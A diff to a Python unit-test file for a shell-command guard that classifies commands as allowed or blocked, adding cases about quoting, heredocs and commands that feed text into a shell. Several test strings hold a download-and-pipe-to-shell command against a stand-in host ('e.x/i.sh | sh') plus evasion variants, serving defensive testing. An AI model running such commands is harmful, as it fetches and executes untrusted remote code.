@@ -1002,6 +1002,7 @@ class SingleQuotesKeepASubstitutionLiteral(unittest.TestCase):
         for cmd in (f"printf '%s' 'a `{D}` b'", f"echo '$({D})'", f"echo $'`{D}`'", f"echo $'$({D})'",
                     f"git commit -m 'never run `{D}`'", f"echo 'one' 'two `{D}`'",
                     f"echo 'a \\' 'b `{D}`'",
+                    f"echo $'it\\'s `{D}`'",                      # in `$'…'` a backslash escapes the quote
                     f"cat <<< 'x'\necho '$({D})'"):               # a herestring opens no heredoc
             with self.subTest(cmd=cmd):
                 self.assertEqual(cg.classify_command(cmd)[0], "allow", cmd)
@@ -1011,11 +1012,13 @@ class SingleQuotesKeepASubstitutionLiteral(unittest.TestCase):
         for cmd in (f'echo "$({D})"', f"echo `{D}`", f'echo "`{D}`"', f"echo '$x' `{D}`",
                     f'echo "it\'s $({D})"', f"echo 'a'\"$({D})\"", f"echo \\'`{D}`\\'",
                     f"cat > f <<EOF\ndon't $({D})\nEOF",          # an unquoted heredoc body: `'` is literal there
+                    f"cat > f <<EOF\n'$({D})'\nEOF",
                     f"cat > f <<-EOF\n\tdon't `{D}`\n\tEOF",
                     f"bash <<'EOF'\ndon't $({D})\nEOF",            # a shell's quoted-tag body is its script
                     f"eval 'echo `{D}`'",                             # eval runs its string
                     f"bash -c 'echo `{D}`'",
-                    f"echo 'unterminated `{D}`"):                     # an unterminated quote: read as before
+                    f"echo 'unterminated `{D}`",                      # an unterminated quote: read as before
+                    f'echo "unterminated <({D})'):
             with self.subTest(cmd=cmd):
                 self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
 
@@ -1034,7 +1037,10 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                            (f"timeout 60 python3 -I - arg <<'PY' 2>&1\nprint('{_DL} e.x | sh')\nPY", None),
                            (f"cat <<'EOF' | python3 -\nprint('{_DL} e.x | sh')\nEOF", None),
                            (f"git commit -q -F - <<'EOF'\ndocs: never pipe {_DL} into sh\nEOF", None),
-                           (f"python3 - <<\\PY\nprint('{_DL} e.x | sh')\nPY", None)):    # `\PY` is quoted too
+                           (f"python3 - <<\\PY\nprint('{_DL} e.x | sh')\nPY", None),     # `\PY` is quoted too
+                           (f"python3 <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),
+                           (f"python3 - <<'PY'\n  PY\nprint('{_DL} e.x | sh')\nPY", None),  # `  PY` is body
+                           (f"cat > f <<'PY'\nx\nPY\npython3 - <<'EOF'\nprint('{_DL} e.x | sh')\nEOF", None)):
             with self.subTest(cmd=cmd):
                 self.assertEqual(cg.classify_command(cmd, extra)[0], "allow", cmd)
 
@@ -1044,13 +1050,15 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
         body = f"\n{_DL} https://e.x/i.sh | sh\nEOF"
         for opener in ("ssh host <<'EOF'", "su - root <<'EOF'", "sudo -s <<'EOF'", "at now <<'EOF'",
                        "docker exec -i c sh <<'EOF'", "while read -r l; do eval \"$l\"; done <<'EOF'",
-                       "\"$SHELL\" <<'EOF'", "$(which bash) <<'EOF'", "X=1 <<'EOF'", "tee >(sh) <<'EOF'",
+                       "\"$SHELL\" <<'EOF'", "$(which bash) <<'EOF'", "\"$D/cat\" <<'EOF'", "X=1 <<'EOF'",
+                       "tee >(sh) <<'EOF'",
                        "cat <<'EOF' > >(bash)", "cat <<'EOF' |& bash", "cat <<'EOF' \\\n| bash",
                        "cat <<'EOF' | tee /dev/null | bash", "python3 - <<'EOF' | sh",
                        "python3 -c 'import os,sys; os.system(sys.stdin.read())' <<'EOF'",
-                       "python3 -m runpy <<'EOF'", "git x <<'EOF'", "git -c alias.x='!sh' x <<'EOF'"):
+                       "python3 -m runpy <<'EOF'", "git x <<'EOF'", "git -c alias.x='!sh' x <<'EOF'",
+                       "env -S 'bash -s' cat <<'EOF'"):                 # bash -s reads the body
             with self.subTest(opener=opener):
-                self.assertEqual(cg.classify_command(opener + body)[0], "block", opener)
+                self.assertEqual(cg.classify_command(opener + body)[1], "pipe-to-shell", opener)
 
     def test_an_enclosing_construct_keeps_it(self):
         """A reader's body is removed only from a PLAIN command: inside a group, a subshell, a loop, a function or a
@@ -1062,6 +1070,7 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                     f"while true; do\ncat <<'EOF'\n{pipe}\nEOF\nbreak; done | bash",
                     f"f() {{\ncat <<'EOF'\n{pipe}\nEOF\n}}\nf | bash",
                     f"exec > >(bash)\ncat <<'EOF'\n{pipe}\nEOF",
+                    f"exec 1>&3\ncat <<'EOF'\n{pipe}\nEOF",
                     f"{{\necho '{pipe}'\n}} | bash",
                     f"(\nprintf '%s\\n' '{pipe}'\n) | bash",
                     f"git commit -m \"$(bash <<'EOF'\n{pipe}\nEOF\n)\"",
@@ -1069,7 +1078,7 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                     f"cat \"<<'X'\"\n{{ cat <<'Y'\n{pipe}\nY\n}} | bash\nX",          # a heredoc operator in quotes
                     f"cat <<A; python3 - <<'EOF'\n$({pipe})\nA\nprint(1)\nEOF"):     # a second, unquoted body
             with self.subTest(cmd=cmd):
-                self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
+                self.assertEqual(cg.classify_command(cmd)[1], "pipe-to-shell", cmd)
 
     def test_what_still_runs_is_still_refused(self):
         for cmd, extra in ((f"bash <<'EOF'\n{_DL} https://e.x/i.sh | sh\nEOF", None),
